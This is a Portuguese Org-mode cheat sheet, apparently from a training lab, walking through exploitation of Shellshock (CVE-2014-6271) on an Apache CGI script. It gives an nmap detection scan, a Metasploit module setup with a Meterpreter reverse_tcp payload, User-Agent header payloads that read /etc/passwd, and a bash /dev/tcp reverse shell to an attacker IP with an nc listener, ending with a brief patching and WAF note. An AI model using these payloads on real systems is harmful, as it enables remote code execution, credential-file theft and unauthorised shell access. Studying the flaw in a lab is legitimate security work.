#+title: ğŸš Shellshock (CVE-2014-6271) no APache 
#+author: Gabriel
#+options: num:nil toc:t

* ğŸ› ï¸ Reconhecimento e ValidaÃ§Ã£o
A vulnerabilidade ocorre quando scripts CGI no Apache chamam o Bash para processar requisiÃ§Ãµes, permitindo injeÃ§Ã£o de comandos via variÃ¡veis de ambiente.

** ğŸ“¡ Scan de Vulnerabilidade (Nmap)
Antes de explorar, validamos a existÃªncia da falha no endpoint especÃ­fico identificado.

#+begin_src sh
# -sV: DetecÃ§Ã£o de versÃ£o
# --script: Usa o script especÃ­fico para Shellshock
# --script-args: Define o caminho do script CGI alvo
nmap -sV --script http-shellshock \
     --script-args "http-shellshock.uri=/gettime.cgi" 172.16.5.35
#+end_src

* ğŸš€ ExploraÃ§Ã£o com Metasploit
O mÃ³dulo automatizado facilita a obtenÃ§Ã£o do Meterpreter configurando o cabeÃ§alho HTTP corretamente.

#+begin_src sh
use multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS 172.16.5.35
set TARGETURI /gettime.cgi
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST 10.10.62.4  # Seu IP no Kali
exploit
#+end_src



* ğŸ•µï¸ ExploraÃ§Ã£o Manual (RCE via User-Agent)
A exploraÃ§Ã£o manual via **Burp Suite** Ã© fundamental para entender como o payload Ã© injetado no cabeÃ§alho HTTP.

** ğŸ§© Payload de InjeÃ§Ã£o
O Bash executa o cÃ³digo apÃ³s a definiÃ§Ã£o de uma funÃ§Ã£o vazia:
#+begin_example
() { :; }; echo; /bin/cat /etc/passwd
#+end_example

** ğŸ›°ï¸ Passos no Burp Suite
1. Intercepta a requisiÃ§Ã£o para =/gettime.cgi=.
2. No campo **User-Agent**, substitua o valor original pelo payload:
   
   #+begin_src http
   User-Agent: () { :; }; echo; /bin/bash -c "cat /etc/passwd"
   #+end_src

3. Observe a resposta com o conteÃºdo do arquivo =/etc/passwd= no corpo da mensagem.

** ğŸš Obtendo Reverse Shell
Para estabilizar o acesso sem Metasploit, injetamos um comando de shell reverso no User-Agent:

#+begin_src sh
# No seu Kali (Terminal Zsh):
nc -lvnp 4444
#+end_src

#+begin_src http
# No Burp Suite (User-Agent):
User-Agent: () { :; }; echo; /bin/bash -i >& /dev/tcp/10.10.62.4/4444 0>&1
#+end_src

* ğŸ›¡ï¸ MitigaÃ§Ã£o e Defesa
- **Patching**: Atualizar a versÃ£o do GNU Bash.
- **WAF**: Configurar regras de firewall de aplicaÃ§Ã£o para bloquear padrÃµes de funÃ§Ãµes Bash em cabeÃ§alhos HTTP.

